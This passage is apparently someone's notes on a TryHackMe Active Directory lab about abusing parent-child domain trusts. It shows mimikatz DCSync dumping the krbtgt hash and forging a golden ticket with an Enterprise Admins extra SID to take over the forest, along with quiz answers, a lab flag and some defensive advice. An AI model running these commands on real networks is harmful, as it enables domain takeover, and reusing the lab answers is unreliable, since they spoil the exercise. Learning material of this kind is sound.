-   Transitive - The trust relationship expands beyond just two domains to include other trusted domains

Parent: TRYHACKME.LOC
Sub-domain: ZA.TRYHACKME.LOC, UK.TRYHACKME.LOC etc.

Here we are allowed to share resources between the sub domains as there is a bi-directional trust established. There is also trust between parent and child which we can take advatage of.

__KRBTGT and Golden Tickets__

KRBTGT is the account used for Microsoft's Kerberos. This is the service account for the KDC service which handles all Kerberos tickets. It encrypts and signs all tickets. The password hash is shared between domain controllers so they are verify the authenticity of a TGT when users ask for resources.

If we want a TGT to get access to everything, this is known as a Golden Ticket Attack. 

To Forge TGTs and be the TGS ourselves, we need the following info:'
-   The FQDN of the domain
-   The Security Identifier (SID) of the domain
-   The username of the account we want to impersonate
-   The KRBTGT password hash

The 1st 3 are easy to recover but the last one requires we compromise the domain controller. However, we already compromised the Tier 0 admins group with a forged cert so we can use mimikatz to recover the cert:

```shell-session
C:\Tools>mimikatz_trunk\x64\mimikatz.exe 

.#####. mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 
.## ^ ##. "A La Vie, A L'Amour" - (oe.eo) 
## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) 
## \ / ## > https://blog.gentilkiwi.com/mimikatz 
'## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) 
'#####' > https://pingcastle.com / https://mysmartlogon.com ***/ 

mimikatz # privilege::debug 
Privilege '20' OK mimikatz 
# lsadump::dcsync /user:za\krbtgt 
[DC] 'za.tryhackme.loc' will be the domain 
[DC] 'THMDC.za.tryhackme.loc' will be the DC server 
[DC] 'za\krbtgt' will be the user account 
[rpc] Service : ldap 
[rpc] AuthnSvc : GSS_NEGOTIATE (9) 

Object RDN : krbtgt 

** SAM ACCOUNT ** 

SAM Username : krbtgt 
Account Type : 30000000 ( USER_OBJECT ) 
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT ) 
Account expiration : 
Password last change : 4/25/2022 7:18:22 PM 
Object Security ID : S-1-5-21-3885271727-2693558621-2658995185-502 
Object Relative ID : 502 

Credentials: 
	Hash NTLM: removed 
		ntlm- 0: removed 
		lm - 0: removed 
[....]
```

__Inter-Realm TGTs__

Using the KRBTGT password hash we can now forge a Golden Ticket to access any resource in the child domains.  We can for another step tho and forge an inter-realm ticket. 

We can include extra SIDs using mimikatz. These are a pointer to KERB_SID_AND_ATTRIBUTES structures that contain a list of SID to corresponding groups in domains outside the account domain to which the principal belongs.

Here we want to exploit this trust by adding the SID of the Enterprise Admins (EA) group as an extra SID to our forged ticket on the domain controller of the child domain. Since this EA group belongs to the parent, granting this gives us access to the entire forest..

SID for EA: S-1-5-21-ROOTDOMAINID-519

First we need to find 2 SIDs:

-   The SID of the child domain controller (THMDC), which we will impersonate in our forgedTGT  
    
-   The SID of the Enterprise Admins in the parent domain, which we will add as an extra SID to our forgedTGT

We can use the AD-RSAT Powershell cmdlets:

```Powershell
PS C:\> Get-ADComputer -Identity "THMDC" 

DistinguishedName : CN=THMDC,OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc 
DNSHostName : THMDC.za.tryhackme.loc 
Enabled : True 
Name : THMDC 
ObjectClass : computer 
ObjectGUID : bd651750-782b-4b09-93b4-b5987ec7311b 

SamAccountName : THMDC$ 
SID : S-1-5-21-3885271727-2693558621-2658995185-1001 

UserPrincipalName :
```

Next we need the SID of the EA group:

```Powershell
PS C:\> Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc 

DistinguishedName : CN=Enterprise Admins,CN=Users,DC=tryhackme,DC=loc 

GroupCategory : Security 
GroupScope : Universal 
Name : Enterprise Admins 
ObjectClass : group 
ObjectGUID : a23ae384-16e8-44d5-9b36-8173c4e0e5de SamAccountName : Enterprise Admins 
SID : S-1-5-21-3330634377-removed-519

```

__Exploiting Domain Trusts__

Now that we have the info we need we can use mimikatz to create our Golden Ticket:

```Powershell
```shell-session
C:\Tools>mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:<Password hash of krbtgt user> /sids:<SID of Enterprise Admins group> /ptt
User      : Administrator
Domain    : za.tryhackme.loc (ZA)
SID       : S-1-5-21-3885271727-2693558621-2658995185-1001
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3330634377-1326264276-632209373-519 ;
ServiceKey: 16f9af38fca3ada405386b3b57366082 - rc4_hmac_nt
Service   : krbtgt
Lifetime  : 4/30/2022 7:52:51 PM ; 4/27/2032 7:52:51 PM ; 4/27/2032 7:52:51 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ za.tryhackme.loc' successfully submitted for current session
```

First, we will verify that this ticket works for access to THMDC since it is a valid ticket for the Administrator user of the child domain:

Command Prompt

```shell-session
C:\>dir \\thmdc.za.tryhackme.loc\c$
 Volume in drive \\thmdc.za.tryhackme.loc\c$ is Windows
 Volume Serial Number is 1634-22A9

 Directory of \\thmdc.za.tryhackme.loc\c$

01/04/2022  08:47 AM               103 delete-vagrant-user.ps1
04/30/2022  10:24 AM               154 dns_entries.csv
09/15/2018  08:19 AM    <DIR>          PerfLogs
03/21/2020  09:31 PM    <DIR>          Program Files
03/21/2020  09:28 PM    <DIR>          Program Files (x86)
04/27/2022  08:27 AM             1,423 thm-network-setup-dc.ps1
04/25/2022  07:13 PM    <DIR>          tmp
04/27/2022  08:22 AM    <DIR>          Users
04/25/2022  07:11 PM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant]
04/27/2022  08:12 PM    <DIR>          Windows
               7 File(s)      2,356,811 bytes
               7 Dir(s)  50,913,189,888 bytes free;
```

```shell-session
mimikatz # lsadump::dcsync /user:za\krbtgt

Object RDN    : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOU?NT)
Account expiration   :
Password last change : 4/25/2022 7:18:22 PM
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-502
Object Relative ID   : 502

Credentials:
   Hash NTLM: 16f9af38fca3ada405386b3b57366082
     ntlm- 0: 16f9af38fca3ada405386b3b57366082
     lm  - 0: 35c7b671efe40860dc078afd2786c902
```

Using Mimikatz to generate Golden Ticket:
```shell-session
mimikatz # kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:16f9af38fca3ada405386b3b57366082 /sids:S-1-5-21-3330634377-1326264276-632209373-519 /ptt

misc:cmd
explorer
```

Browse to: `\\thmrootdc.tryhackme.loc\C$`

__Questions__

What domain trust relationship is by default configured between a parent and a child domain?
Answer: _bidirectional trust_

What is the name of the AD account used by the KDC to encrypt and sign TGTs?
Answer: _krbtgt_

What is the name of theTGTthat grants access to resources outside of our current domain?
Answer: _Inter-realm tgt_

What is the value of the flag stored on THMROOTDC in the Administrator's Desktop folder (flag6.txt)?
Answer: _THM{Full.EA.Compromise}_


Task9 - Conclusion
---------------------------

Main points:
* Process will take time
* All AD enviroments will be different
* Process is cyclic.
* Enumerate to each level, advance, repeat until DA is achieved.

Defending against AD attacks is very difficult because many of the attack paths have legitimate business use cases.

Here are some possible defenses:

-   We need to ensure that no configuration breaks our tiering model. Accounts in a lower tier should not have the ability to interact with resources in a higher tier. Furthermore, accounts from a higher tier should never log onto resources in a lower tier.
-   The principle of least privilege should be followed when permission delegation is performed. Furthermore, permission delegation should adhere to the tiering model, ensuring that a lower-tiered object can't alter a higher tiered object.
-   SMB signing should be enforced, not just enabled. This will prevent credential relay attempts.
-   AD objects and their configuration are not the only paths for exploitation. AD services, such as AD CS should also be considered part of the attack surface and secured.
-   We need to implement sufficient security controls to protect Tier 0 infrastructure and accounts in our child domains since a compromise of one can lead to the compromise of the entire forest.

After we reach our goals we need to make sure we can persist without someone simply deleting our access.

__Questions__

Done with AD exploitation, ready for AD persistence!
Answer: _none needed_





